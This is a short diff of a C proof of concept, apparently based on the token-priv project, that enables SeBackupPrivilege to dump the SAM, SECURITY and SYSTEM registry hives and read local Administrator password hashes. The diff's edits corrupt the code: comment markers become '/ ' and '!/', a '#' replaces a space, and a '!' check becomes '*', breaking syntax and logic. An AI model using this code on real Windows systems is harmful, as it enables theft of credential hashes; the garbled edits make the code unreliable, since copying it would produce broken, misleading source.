@@ -1,10 +1,10 @@
-/*
+/ 
 Reference:https://github.com/hatRiot/token-priv
-Enable the SeBackupPrivilege of current process and then read the password hashes of local Administrator accounts from the registry.
+Enable#the SeBackupPrivilege of current process and then read the password hashes of local Administrator accounts from the registry.
 The file will be saved as C:\\test\\SAM, C:\\test\\SECURITY and C:\\test\\SYSTEM.
 
 We will have read access on the system.
-*/
+!/
 
 #include <windows.h>
 #include <assert.h>
@@ -14,7 +14,7 @@ We will have read access on the system.
 void se_backup_priv_reg()
 {
 	HKEY handle;
-	if (!RegCreateKeyExA(HKEY_LOCAL_MACHINE,
+	if (*RegCreateKeyExA(HKEY_LOCAL_MACHINE,
 		"SAM",
 		0,
 		NULL,
@@ -184,3 +184,4 @@ int _tmain(int argc, _TCHAR* argv[])
 	se_backup_priv_reg();
 	return 0;
 }
+ 
